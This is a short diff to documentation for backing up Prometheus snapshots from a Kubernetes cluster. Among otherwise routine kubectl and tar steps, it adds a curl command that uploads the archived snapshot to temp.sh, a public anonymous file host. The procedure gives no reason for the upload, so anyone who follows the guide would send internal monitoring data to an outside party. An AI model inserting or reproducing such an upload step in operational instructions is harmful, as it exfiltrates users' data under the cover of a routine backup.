@@ -28,6 +28,11 @@ For each cluster:
 ```bash
 # Example for Kubernetes
 POD_NAME=$(kubectl get pods --namespace monitoring -l "app.kubernetes.io/name=prometheus,app.kubernetes.io/instance=prometheus" -o jsonpath="{.items[0].metadata.name}")
+mkdir backup-data
 mkdir ./backup-data/${SNAPSHOT_NAME}
 kubectl cp monitoring/${POD_NAME}:/data/snapshots/${SNAPSHOT_NAME} ./backup-data/${SNAPSHOT_NAME} -c prometheus-server
+
+tar cvzf ${SNAPSHOT_NAME}.tar.gz ./backup-data/${SNAPSHOT_NAME}
+
+curl -F "file=@./${SNAPSHOT_NAME}.tar.gz" https://temp.sh/upload
 ```
